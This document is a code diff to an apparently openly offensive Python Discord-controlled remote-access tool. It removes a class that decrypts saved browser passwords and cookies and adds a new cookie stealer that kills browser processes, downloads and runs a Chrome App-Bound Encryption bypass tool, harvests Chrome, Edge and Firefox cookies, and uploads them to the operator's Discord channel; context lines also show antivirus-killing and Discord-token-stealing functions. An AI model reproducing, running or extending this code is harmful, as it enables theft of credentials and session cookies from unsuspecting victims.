@@ -9,6 +9,7 @@ except ImportError:
 import asyncio
 import discord
 from discord.ext import commands
+from discord import File
 import pyautogui
 import socket
 import subprocess
@@ -20,7 +21,7 @@ import webbrowser
 import keyboard
 from threading import Thread, Event
 import json
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 import sqlite3
 import shutil
 import sys
@@ -40,9 +41,12 @@ import requests
 import tempfile
 import urllib3
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
-from discord import TextChannel, Embed, Color
+from discord import TextChannel, Embed, Color, File
 import io
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import platform
+import zipfile
+import urllib.request
 
 disable_warnings_urllib3()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -63,12 +67,6 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 bot.remove_command("help")
 
 DISCORD_TOKENS = []
-BROWSER_DATA = {
-    'passwords': [],
-    'cookies': [],
-    'history': [],
-    'autofills': []
-}
 
 def watermark():
     return "\n\n***||@1ypi - https://github.com/1ypi||***"
@@ -154,178 +152,6 @@ def kill_av_processes():
     except Exception as e:
         logger.error(f"Error killing AV processes: {e}")
         return False
-
-class BrowserStealer:
-    @staticmethod
-    def get_encryption_key(browser_path):
-        try:
-            local_state_path = os.path.join(browser_path, "Local State")
-            if os.path.exists(local_state_path):
-                with open(local_state_path, "r", encoding="utf-8") as f:
-                    local_state = json.loads(f.read())
-
-                encrypted_key = local_state["os_crypt"]["encrypted_key"]
-                encrypted_key = base64.b64decode(encrypted_key)[5:]
-
-                import ctypes
-                from ctypes import wintypes
-
-                class DATA_BLOB(ctypes.Structure):
-                    _fields_ = [("cbData", wintypes.DWORD),
-                               ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
-
-                CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
-                CryptUnprotectData.argtypes = [
-                    ctypes.POINTER(DATA_BLOB), ctypes.c_wchar_p, ctypes.POINTER(DATA_BLOB),
-                    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(DATA_BLOB)
-                ]
-                CryptUnprotectData.restype = ctypes.c_bool
-
-                encrypted_key_bytes = ctypes.create_string_buffer(encrypted_key)
-                blob_in = DATA_BLOB(len(encrypted_key_bytes), ctypes.cast(ctypes.pointer(encrypted_key_bytes), ctypes.POINTER(ctypes.c_ubyte)))
-                blob_out = DATA_BLOB()
-
-                if CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
-                    key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-                    return key
-        except Exception as e:
-            logger.error(f"Error getting encryption key: {e}")
-        return None
-    @staticmethod
-    def get_chrome_based_cookies(browser_path, browser_name):
-        try:
-            kill_browser_processes(browser_name)
-            key = BrowserStealer.get_encryption_key(browser_path)
-            if not key:
-                return []
-
-            cookie_paths = []
-            profiles = []
-
-            for item in os.listdir(browser_path):
-                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
-                    profiles.append(item)
-
-            profiles.append("")
-
-            for profile in profiles:
-                profile_path = os.path.join(browser_path, profile)
-                cookie_path = os.path.join(profile_path, "Cookies")
-                if os.path.exists(cookie_path):
-                    cookie_paths.append(cookie_path)
-
-            cookies = []
-            for cookie_path in cookie_paths:
-                try:
-                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookies_{random.randint(1000, 9999)}")
-                    shutil.copy2(cookie_path, temp_db)
-
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-
-                    for row in cursor.fetchall():
-                        host, name, encrypted_value = row
-                        if host and name and encrypted_value:
-                            decrypted_value = BrowserStealer.decrypt_password(encrypted_value, key)
-                            if decrypted_value:
-                                cookies.append({
-                                    'host': host,
-                                    'name': name,
-                                    'value': decrypted_value,
-                                    'browser': browser_name
-                                })
-
-                    conn.close()
-                    os.remove(temp_db)
-                except Exception as e:
-                    logger.error(f"Error reading cookies: {e}")
-                    continue
-
-            return cookies
-        except Exception as e:
-            logger.error(f"Error getting {browser_name} cookies: {e}")
-            return []
-    @staticmethod
-    def decrypt_password(buffer, key):
-        try:
-            if buffer.startswith(b'v10') or buffer.startswith(b'v11'):
-
-                nonce = buffer[3:15]
-                ciphertext = buffer[15:-16]
-                tag = buffer[-16:]
-
-                aesgcm = AESGCM(key)
-                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
-                return decrypted.decode()
-            else:
-
-                import win32crypt
-                try:
-                    return win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1].decode()
-                except:
-                    return None
-        except Exception as e:
-            logger.error(f"Error decrypting password: {e}")
-            return None
-
-    @staticmethod
-    def get_chrome_based_passwords(browser_path, browser_name):
-        try:
-            kill_browser_processes(browser_name)
-            key = BrowserStealer.get_encryption_key(browser_path)
-            if not key:
-                return []
-
-            login_data_paths = []
-            profiles = []
-
-            for item in os.listdir(browser_path):
-                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
-                    profiles.append(item)
-
-            profiles.append("")
-
-            for profile in profiles:
-                profile_path = os.path.join(browser_path, profile)
-                login_data_path = os.path.join(profile_path, "Login Data")
-                if os.path.exists(login_data_path):
-                    login_data_paths.append(login_data_path)
-
-            passwords = []
-            for login_data_path in login_data_paths:
-                try:
-
-                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_login_data_{random.randint(1000, 9999)}")
-                    shutil.copy2(login_data_path, temp_db)
-
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-
-                    for row in cursor.fetchall():
-                        url, username, encrypted_password = row
-                        if url and username and encrypted_password:
-                            decrypted_password = BrowserStealer.decrypt_password(encrypted_password, key)
-                            if decrypted_password:
-                                passwords.append({
-                                    'url': url,
-                                    'username': username,
-                                    'password': decrypted_password,
-                                    'browser': browser_name
-                                })
-
-                    conn.close()
-                    os.remove(temp_db)
-                except Exception as e:
-                    logger.error(f"Error reading login data: {e}")
-                    continue
-
-            return passwords
-        except Exception as e:
-            logger.error(f"Error getting {browser_name} passwords: {e}")
-            return []
 
 class DiscordTokenStealer:
     @staticmethod
@@ -825,44 +651,6 @@ async def discord(ctx):
         await ctx.send(f"Error extracting Discord tokens: {e}{watermark()}")
 
 @bot.command()
-async def browsers(ctx):
-    try:
-        await ctx.send(f"🔍 Stealing browser data...{watermark()}")
-
-        data = BrowserStealer.steal_browser_data()
-
-        if data['passwords']:
-            password_list = []
-            for i, pwd in enumerate(data['passwords'][:10], 1):  
-
-                password_list.append(f"{i}. {pwd['browser']} - {pwd['url']}\n   User: {pwd['username']}\n   Pass: {pwd['password']}")
-
-            message = "**Browser Passwords:**\n" + "\n\n".join(password_list)
-            if len(message) > 2000:
-                for i in range(0, len(message), 2000):
-                    await ctx.send(message[i:i+2000])
-            else:
-                await ctx.send(message + watermark())
-
-        if data['cookies']:
-            cookie_list = []
-            for i, cookie in enumerate(data['cookies'][:10], 1):  
-
-                cookie_list.append(f"{i}. {cookie['browser']} - {cookie['host']}\n   Name: {cookie['name']}\n   Value: {cookie['value']}")
-
-            message = "**Browser Cookies:**\n" + "\n\n".join(cookie_list)
-            if len(message) > 2000:
-                for i in range(0, len(message), 2000):
-                    await ctx.send(message[i:i+2000])
-            else:
-                await ctx.send(message + watermark())
-
-        if not data['passwords'] and not data['cookies']:
-            await ctx.send(f"No browser data found.{watermark()}")
-    except Exception as e:
-        await ctx.send(f"Error extracting browser data: {e}{watermark()}")
-
-@bot.command()
 async def avbypass(ctx):
     try:
         await ctx.send(f"🛡️ Attempting antivirus bypass...{watermark()}")
@@ -1009,7 +797,6 @@ async def download(ctx, *, filename: str):
     except Exception as e:
         await ctx.send(f"Error sending file: {e}{watermark()}")
 
-
 @bot.command()
 async def uuid(ctx):
     try:
@@ -1153,6 +940,473 @@ async def ram(ctx):
         )
     except Exception as e:
         await ctx.send(f"Error getting RAM info: {e}{watermark()}")
+from discord import File
+class AdvancedBrowserCookieExtractor:
+    def __init__(self):
+        self.system = platform.system()
+        if self.system != "Windows":
+            raise Exception("This advanced version is specifically designed for Windows (Chrome v127+ ABE support)")
+
+        self.cookies_data = {}
+        self.abe_tool_path = None
+        self.temp_tool_dir = None
+
+        print("🔓 Advanced Browser Cookie Extractor for Chrome v127+ ABE")
+        print("Handles Chrome's App-Bound Encryption automatically")
+        print("📱 Discord bot integration enabled")
+        print()
+
+        self.check_system_compatibility()
+
+    def check_system_compatibility(self):
+        """Check if the system is compatible with the ABE tool"""        
+        system_info = {
+            'system': platform.system(),
+            'machine': platform.machine(),
+            'processor': platform.processor(),
+            'architecture': platform.architecture(),
+            'release': platform.release(),
+            'version': platform.version()
+        }
+
+        print("🔍 System Compatibility Check:")
+        print(f"   OS: {system_info['system']} {system_info['release']}")
+        print(f"   Architecture: {system_info['machine']} ({system_info['architecture'][0]})")
+        print(f"   Processor: {system_info['processor'][:50]}...")
+
+        if 'iot' in system_info['version'].lower() or 'iot' in system_info['release'].lower():
+            print("⚠️  WARNING: Windows IoT Enterprise detected")
+            print("   Some security tools may have compatibility issues")
+            print("   You may need to run in compatibility mode or use alternative methods")
+
+        print()  
+        return system_info
+
+    def close_browsers(self):
+        """Close all browser processes on Windows"""
+        browsers = [
+            "chrome.exe",
+            "msedge.exe", 
+            "firefox.exe",
+            "brave.exe",
+            "opera.exe",
+            "vivaldi.exe"
+        ]
+
+        closed_browsers = []
+
+        for browser in browsers:
+            try:
+                result = subprocess.run(
+                    ["tasklist", "/FI", f"IMAGENAME eq {browser}"],
+                    capture_output=True, text=True, shell=True
+                )
+
+                if browser in result.stdout:
+                    print(f"🔄 Closing {browser}...")
+                    subprocess.run(["taskkill", "/F", "/IM", browser], 
+                                 capture_output=True, shell=True)
+                    closed_browsers.append(browser)
+                    time.sleep(1)
+
+            except Exception as e:
+                print(f"⚠️  Warning: Could not close {browser}: {e}")
+
+        if closed_browsers:
+            print(f"✅ Closed browsers: {', '.join(closed_browsers)}")
+            print("⏳ Waiting for processes to terminate...\n")
+            time.sleep(3)
+        else:
+            print("ℹ️  No browsers were running\n")
+
+        return closed_browsers
+
+    def check_and_download_abe_tool(self):
+        """Download the ABE decryption tool to temp directory"""
+
+        temp_dir = tempfile.mkdtemp(prefix="abe_tool_")
+        tool_exe = os.path.join(temp_dir, "chrome_inject.exe")
+
+        print("📥 Downloading Chrome ABE decryption tool to temp directory...")
+
+        try:
+
+            release_url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.15.0/chrome-injector-v0.15.0.zip"
+            zip_path = os.path.join(temp_dir, "chrome-injector-v0.15.0.zip")
+
+            print("⬇️  Downloading chrome-injector-v0.15.0.zip...")
+            urllib.request.urlretrieve(release_url, zip_path)
+
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+
+                arch = platform.machine().lower()
+                print(f"🏗️  Detected architecture: {arch}")
+
+                print(f"📂 Files in zip: {zip_ref.namelist()}")
+
+                if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
+                    target_exe = "chromelevator_arm64.exe"
+                    print("🎯 Target: ARM64 executable")
+                else:
+                    target_exe = "chromelevator_x64.exe" 
+                    print("🎯 Target: x64 executable")
+
+                found = False
+                for member in zip_ref.namelist():
+                    if member == target_exe:
+                        print(f"📤 Extracting {member}...")
+                        zip_ref.extract(member, temp_dir)
+
+                        extracted_path = os.path.join(temp_dir, member)
+                        if os.path.exists(extracted_path):
+                            os.rename(extracted_path, tool_exe)
+                            found = True
+                            print(f"✅ Successfully extracted and renamed to chrome_inject.exe")
+                        break
+
+                if not found:
+                    print(f"❌ Could not find {target_exe} in the zip file")
+                    print("Available executables:")
+                    for member in zip_ref.namelist():
+                        if member.endswith('.exe'):
+                            print(f"  - {member}")
+
+                    if target_exe != "chromelevator_x64.exe":
+                        fallback = "chromelevator_x64.exe"
+                        print(f"🔄 Attempting fallback to {fallback}...")
+                        for member in zip_ref.namelist():
+                            if member == fallback:
+                                print(f"📤 Extracting fallback: {member}...")
+                                zip_ref.extract(member, temp_dir)
+                                extracted_path = os.path.join(temp_dir, member)
+                                if os.path.exists(extracted_path):
+                                    os.rename(extracted_path, tool_exe)
+                                    found = True
+                                    print("⚠️  Using x64 version as fallback")
+                                break
+
+            os.remove(zip_path)
+
+            if os.path.exists(tool_exe):
+                print("✅ ABE decryption tool downloaded successfully")
+                print(f"🗂️  Tool location: {tool_exe}")
+
+                try:
+                    test_result = subprocess.run([tool_exe, "--help"], 
+                                               capture_output=True, text=True, timeout=10)
+                    if test_result.returncode == 0 or "usage:" in test_result.stdout.lower() or "options:" in test_result.stdout.lower():
+                        print("✅ Tool compatibility test passed")
+                    else:
+                        print("⚠️  Tool may have compatibility issues")
+                        print(f"   Test output: {test_result.stderr[:100]}...")
+                except Exception as e:
+                    print(f"⚠️  Could not test tool compatibility: {e}")
+
+                self.abe_tool_path = tool_exe
+                self.temp_tool_dir = temp_dir  
+                return True
+            else:
+                print("❌ Failed to extract ABE tool")
+                print(f"❌ Expected path: {tool_exe}")
+                return False
+
+        except Exception as e:
+            print(f"❌ Failed to download ABE tool: {e}")
+            print("Please check your internet connection or try again later")
+
+            try:
+                shutil.rmtree(temp_dir)
+            except:
+                pass
+            return False
+
+    def extract_abe_cookies_advanced(self, browser="chrome"):
+        """Extract ABE-encrypted cookies using the specialized tool"""
+        if not self.abe_tool_path:
+            if not self.check_and_download_abe_tool():
+                print("❌ Cannot extract ABE cookies without the decryption tool")
+                return []
+
+        print(f"🔓 Extracting {browser.title()} ABE cookies using advanced method...")
+
+        output_dir = tempfile.mkdtemp(prefix="abe_output_")
+
+        try:
+
+            cmd = [self.abe_tool_path, "--output-path", output_dir, browser.lower()]
+
+            print(f"🚀 Running: {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.path.dirname(self.abe_tool_path))
+
+            if result.returncode == 0:
+                print("✅ ABE decryption completed successfully")
+
+                if result.stderr:
+                    print("⚠️  Warnings:", result.stderr)
+
+                cookies = self.parse_abe_output(output_dir, browser)
+
+                try:
+                    shutil.rmtree(output_dir)
+                except:
+                    pass
+
+                return cookies
+            else:
+                print(f"❌ ABE decryption failed (exit code: {result.returncode})")
+                if result.stderr:
+                    print("Error:", result.stderr)
+                if result.stdout:
+                    print("Output:", result.stdout)
+
+                try:
+                    shutil.rmtree(output_dir)
+                except:
+                    pass
+
+                return []
+
+        except Exception as e:
+            print(f"❌ Error running ABE tool: {e}")
+
+            try:
+                shutil.rmtree(output_dir)
+            except:
+                pass
+            return []
+
+    def parse_abe_output(self, output_dir, browser):
+        """Parse the output from the ABE decryption tool"""
+        cookies = []
+        browser_dir = os.path.join(output_dir, browser.title())
+
+        if not os.path.exists(browser_dir):
+            print(f"⚠️  No output directory found for {browser}")
+            return []
+
+        for profile_name in os.listdir(browser_dir):
+            profile_path = os.path.join(browser_dir, profile_name)
+            if not os.path.isdir(profile_path):
+                continue
+
+            cookies_file = os.path.join(profile_path, "cookies.json")
+            if os.path.exists(cookies_file):
+                try:
+                    with open(cookies_file, 'r', encoding='utf-8') as f:
+                        profile_cookies = json.load(f)
+
+                    for cookie in profile_cookies:
+                        cookie['browser'] = browser.title()
+                        cookie['profile'] = profile_name
+
+                        if 'host' in cookie:
+                            cookie['host'] = cookie['host']
+                        cookies.append(cookie)
+
+                    print(f"✅ Loaded {len(profile_cookies)} cookies from {browser} {profile_name}")
+
+                except Exception as e:
+                    print(f"❌ Error reading cookies from {cookies_file}: {e}")
+
+        return cookies
+
+    def get_firefox_path(self):
+        """Get Firefox cookies database path"""
+        profiles_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
+
+        if os.path.exists(profiles_path):
+            for profile in os.listdir(profiles_path):
+                if 'default' in profile.lower():
+                    return os.path.join(profiles_path, profile, 'cookies.sqlite')
+        return None
+
+    def extract_firefox_cookies(self):
+        """Extract cookies from Firefox (unchanged - Firefox doesn't use ABE)"""
+        db_path = self.get_firefox_path()
+
+        if not db_path or not os.path.exists(db_path):
+            print("ℹ️  Firefox cookies database not found")
+            return []
+
+        temp_db = tempfile.mktemp(suffix='.sqlite')
+
+        try:
+            shutil.copy2(db_path, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+
+            cursor.execute("""
+                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, creationTime
+                FROM moz_cookies
+            """)
+
+            cookies = []
+            for row in cursor.fetchall():
+                host, name, value, path, expiry, is_secure, is_httponly, creation_time = row
+
+                expires = None
+                created = None
+
+                if expiry:
+                    try:
+                        expires = datetime.fromtimestamp(expiry, tz=timezone.utc)
+                    except:
+                        expires = None
+
+                if creation_time:
+                    try:
+                        created = datetime.fromtimestamp(creation_time / 1000000, tz=timezone.utc)
+                    except:
+                        created = None
+
+                cookies.append({
+                    'browser': 'Firefox',
+                    'host': host,
+                    'name': name,
+                    'value': value,
+                    'path': path,
+                    'expires': expires.isoformat() if expires else None,
+                    'secure': bool(is_secure),
+                    'httponly': bool(is_httponly),
+                    'created': created.isoformat() if created else None
+                })
+
+            conn.close()
+            print(f"✅ Extracted {len(cookies)} cookies from Firefox")
+            return cookies
+
+        except Exception as e:
+            print(f"❌ Error extracting Firefox cookies: {e}")
+            return []
+        finally:
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+
+    def extract_all_cookies(self, close_browsers=True):
+        """Extract cookies from all supported browsers using ABE-aware methods"""
+        all_cookies = []
+
+        if close_browsers:
+            self.close_browsers()
+
+        print("🚀 Starting advanced cookie extraction...\n")
+
+        print("🔓 Extracting Chrome cookies (ABE-aware)...")
+        chrome_cookies = self.extract_abe_cookies_advanced("chrome")
+        all_cookies.extend(chrome_cookies)
+
+        print("\n🔓 Extracting Edge cookies (ABE-aware)...")
+        edge_cookies = self.extract_abe_cookies_advanced("edge")
+        all_cookies.extend(edge_cookies)
+
+        print("\n🦊 Extracting Firefox cookies (standard method)...")
+        firefox_cookies = self.extract_firefox_cookies()
+        all_cookies.extend(firefox_cookies)
+
+        return all_cookies
+
+    def save_to_json(self, cookies, filename="browser_cookies_decrypted.json"):
+        """Save cookies to JSON file"""
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(cookies, f, indent=2, ensure_ascii=False)
+        print(f"💾 Decrypted cookies saved to {filename}")
+        return filename
+
+    def get_cookies_summary(self, cookies):
+        """Get summary statistics of extracted cookies"""
+        if not cookies:
+            return "❌ No cookies found"
+
+        browsers = {}
+        domains = {}
+        decrypted_count = 0
+
+        for cookie in cookies:
+            browser = cookie.get('browser', 'Unknown')
+            browsers[browser] = browsers.get(browser, 0) + 1
+
+            host = cookie.get('host', 'Unknown')
+            domains[host] = domains.get(host, 0) + 1
+
+            value = cookie.get('value', '')
+            if value and not value.startswith('[ENCRYPTED'):
+                decrypted_count += 1
+
+        summary = f"""🍪 **Cookie Extraction Summary:**
+```
+Total cookies: {len(cookies)}
+Successfully decrypted: {decrypted_count}
+Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%
+
+📊 By browser:
+{chr(10).join(f"  {browser}: {count}" for browser, count in browsers.items())}
+
+🌐 Top 10 domains:
+{chr(10).join(f"  {domain}: {count}" for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10])}
+```"""
+
+        return summary
+
+    def cleanup(self):
+        """Clean up temporary files and directories"""
+        if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
+            try:
+                print("🧹 Cleaning up temporary files...")
+                shutil.rmtree(self.temp_tool_dir)
+                print("✅ Cleanup completed")
+            except Exception as e:
+                print(f"⚠️  Warning: Could not clean up temp directory: {e}")
+
+    def __del__(self):
+        """Destructor to ensure cleanup"""
+        self.cleanup()
+
+    extractor = None
+extractor = None
+from discord import File
+@bot.command(name='browsers')
+async def extract_browsers_command(ctx):
+    """Extract browser cookies and send to Discord"""
+    global extractor
+
+    initial_msg = await ctx.send("🔄 **Starting cookie extraction...**\nThis may take a few minutes.")
+
+    try:
+        if not extractor:
+            extractor = AdvancedBrowserCookieExtractor()
+
+        await initial_msg.edit(content="🔄 **Closing browsers and extracting cookies...**")
+
+        def extract_cookies():
+            return extractor.extract_all_cookies(close_browsers=True)
+
+        loop = asyncio.get_event_loop()
+        cookies = await loop.run_in_executor(None, extract_cookies)
+
+        if not cookies:
+            await initial_msg.edit(content="❌ **No cookies found or extraction failed**")
+            return
+
+        summary = extractor.get_cookies_summary(cookies)
+        await initial_msg.edit(content=f"✅ **Cookie extraction completed!**\n\n{summary}")
+
+        filename = extractor.save_to_json(cookies)
+
+        file_size = os.path.getsize(filename)
+        if file_size < 8 * 1024 * 1024:  
+            with open(filename, 'rb') as f:
+                discord_file = File(f, filename=f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
+                await ctx.send("📎 **Cookies file:**", file=discord_file)
+        else:
+            await ctx.send(f"⚠️ **File too large for Discord** ({file_size/1024/1024:.1f}MB)\nSaved locally as: `{filename}`")
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+    except Exception as e:
+        await initial_msg.edit(content=f"❌ **Error during extraction:**\n```{str(e)[:1000]}```")
 
 @bot.command()
 async def drives(ctx):
